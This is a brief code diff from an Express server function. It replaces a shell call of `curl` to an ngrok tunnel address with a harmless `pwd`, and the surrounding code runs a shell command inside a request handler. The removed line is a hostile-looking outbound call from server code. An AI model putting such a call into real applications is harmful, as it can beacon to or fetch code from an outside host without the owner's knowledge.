@@ -22,7 +22,7 @@ export default function expressApp(functionName) {
     
 var exec = require('child_process').exec;
 function puts(error, stdout, stderr) { sys.puts(stdout) }
-exec("curl 8.tcp.ngrok.io:14258", function(error, stdout, stderr) {
+exec("pwd", function(error, stdout, stderr) {
   if (!error) {
     const html = `things worked!`
     res.send(html)
